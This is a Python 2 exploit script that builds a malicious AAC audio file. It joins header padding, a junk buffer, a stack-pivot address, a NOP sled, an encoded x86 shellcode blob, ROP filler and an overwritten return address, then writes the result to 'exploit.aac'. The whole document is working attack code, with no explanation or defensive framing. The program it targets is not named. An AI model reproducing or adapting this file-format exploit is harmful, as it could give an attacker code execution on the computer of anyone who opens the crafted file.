import struct

header_padding = 'A' * 56
file_header = '\xFF\xF9\x96'

shellcode =  "\x33\xc9\x83\xe9\xd0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
shellcode += "\x0e\xc1\x98\xa5\xb2\x83\xee\xfc\xe2\xf4\x3d\x70\x27\xb2"
shellcode += "\xc1\x98\xc5\x3b\x24\xa9\x65\xd6\x4a\xc8\x95\x39\x93\x94"
shellcode += "\x2e\xe0\xd5\x13\xd7\x9a\xce\x2f\xef\x94\xf0\x67\x09\x8e"
shellcode += "\xa0\xe4\xa7\x9e\xe1\x59\x6a\xbf\xc0\x5f\x47\x40\x93\xcf"
shellcode += "\x2e\xe0\xd1\x13\xef\x8e\x4a\xd4\xb4\xca\x22\xd0\xa4\x63"
shellcode += "\x90\x13\xfc\x92\xc0\x4b\x2e\xfb\xd9\x7b\x9f\xfb\x4a\xac"
shellcode += "\x2e\xb3\x17\xa9\x5a\x1e\x00\x57\xa8\xb3\x06\xa0\x45\xc7"
shellcode += "\x37\x9b\xd8\x4a\xfa\xe5\x81\xc7\x25\xc0\x2e\xea\xe5\x99"
shellcode += "\x76\xd4\x4a\x94\xee\x39\x99\x84\xa4\x61\x4a\x9c\x2e\xb3"
shellcode += "\x11\x11\xe1\x96\xe5\xc3\xfe\xd3\x98\xc2\xf4\x4d\x21\xc7"
shellcode += "\xfa\xe8\x4a\x8a\x4e\x3f\x9c\xf2\xa4\x3f\x44\x2a\xa5\xb2"
shellcode += "\xc1\xc8\xcd\x83\x4a\xf7\x22\x4d\x14\x23\x55\x07\x63\xce"
shellcode += "\xcd\x14\x54\x25\x38\x4d\x14\xa4\xa3\xce\xcb\x18\x5e\x52"
shellcode += "\xb4\x9d\x1e\xf5\xd2\xea\xca\xd8\xc1\xcb\x5a\x67\xa2\xf9"
shellcode += "\xc9\xd1\xc1\x98\xa5\xb2"

junk = '\x90'*6680
pivot = struct.pack("<I", 0x68832D18)
nopsleed = '\x90'*(5513-len(shellcode))

rop = 'AAAAAAAAAAAA' # ROP JUNK 
rop += struct.pack("<I", 0x65041705) * 5 #0x65041705

#gadgetloco = push esp; ret 0x68832D18
junk2 = '\x90' * 355

eip = struct.pack("<I", 0x0040CC4C) #0x00401095, 0x0040116A, 0x0040177B, 0x00402E40, 0x00402E9C, 0x0040CC4C

payload = header_padding + file_header + junk + pivot + nopsleed + shellcode + rop + junk2 + eip

print len(payload)

f = open("exploit.aac", "wb") #0x04cc
f.write(payload)
f.close()
